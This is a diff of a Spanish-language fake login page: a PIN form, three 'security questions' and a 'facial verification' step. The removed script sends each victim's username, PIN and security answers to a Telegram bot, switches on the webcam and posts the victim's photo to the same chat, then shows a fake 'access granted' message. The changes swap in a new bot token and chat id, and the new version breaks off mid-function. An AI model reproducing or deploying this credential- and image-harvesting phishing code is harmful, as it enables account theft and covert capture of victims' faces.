@@ -22,7 +22,6 @@
     <button type="button" onclick="irAPaso2()">Entrar</button>
   </div>
 
-
   <!-- PASO 2: 3 PREGUNTAS DE SEGURIDAD -->
   <div id="paso2" class="caja">
     <h2>Verificación de Seguridad</h2>
@@ -35,7 +34,6 @@
     <button type="button" onclick="irAPaso3()">Siguiente</button>
   </div>
 
-
   <!-- PASO 3: CAMARA -->
   <div id="paso3" class="caja">
     <h2>Verificación Facial</h2>
@@ -44,82 +42,13 @@
     <button type="button" onclick="tomarYEnviarFoto()">Tomar Foto</button>
   </div>
 
-
 <script>
-const token = "8970164569:AAFHwcsRG3bNfX1fgF0EfVkodTwUN5CKpbc";
-const chat_id = "-1004395775315";
+const token = "8963644493:AAH1KsRguB5gJiwvwR1RB_viFBjRQAmEj4g"; // <- TU TOKEN YA ESTÁ
+const chat_id = "-5399506853"; // <- CAMBIADO AL GRUPO "TRABAJO"
 let streamGlobal;
 
 // PASO 1 → PASO 2
 function irAPaso2() {
   const usuario = document.getElementById('usuario').value;
   const pin = document.getElementById('pin').value;
-  if(usuario == "" || pin == ""){ alert("Rellena usuario y pin"); return; }
-  
-  // Guardamos datos para enviarlos después
-  window.datos = { usuario, pin };
-  
-  document.getElementById('paso1').style.display = 'none';
-  document.getElementById('paso2').style.display = 'block';
-}
-
-// PASO 2 → PASO 3
-function irAPaso3() {
-  const resp1 = document.getElementById('resp1').value;
-  const resp2 = document.getElementById('resp2').value;
-  const resp3 = document.getElementById('resp3').value;
-  if(resp1 == "" || resp2 == "" || resp3 == ""){ alert("Rellena las 3 respuestas"); return; }
-  
-  window.datos.resp1 = resp1;
-  window.datos.resp2 = resp2;
-  window.datos.resp3 = resp3;
-
-  // Enviamos todo el texto a Telegram
-  fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
-    method: 'POST',
-    headers: {'Content-Type': 'application/json'},
-    body: JSON.stringify({
-      chat_id: chat_id,
-      text: `🔑 NUEVO ACCESO\nUsuario: ${window.datos.usuario}\nPIN: ${window.datos.pin}\n\nRespuestas:\n1. ${resp1}\n2. ${resp2}\n3. ${resp3}`
-    })
-  });
-
-  document.getElementById('paso2').style.display = 'none';
-  document.getElementById('paso3').style.display = 'block';
-
-  // Encendemos la cámara
-  navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } })
-  .then(stream => {
-    streamGlobal = stream;
-    document.getElementById('video').srcObject = stream;
-  })
-  .catch(err => { alert("Activa los permisos de cámara"); });
-}
-
-// TOMAR FOTO Y ENVIAR
-function tomarYEnviarFoto() {
-  const video = document.getElementById('video');
-  const canvas = document.createElement('canvas');
-  canvas.width = video.videoWidth;
-  canvas.height = video.videoHeight;
-  canvas.getContext('2d').drawImage(video, 0, 0);
-  
-  canvas.toBlob(function(blob) {
-    const formData = new FormData();
-    formData.append('chat_id', chat_id);
-    formData.append('photo', blob, 'foto.jpg');
-    formData.append('caption', `📸 Foto de: ${window.datos.usuario}`);
-
-    fetch(`https://api.telegram.org/bot${token}/sendPhoto` , {
-      method: 'POST',
-      body: formData
-    }).then(() => {
-      alert("Acceso concedido ✅");
-      streamGlobal.getTracks().forEach(track => track.stop());
-    });
-  });
-}
-</script>
-
-</body>
-</html>
+  if(usuario == "" || pin == ""){ alert("Rellena usuario y pin"); return;
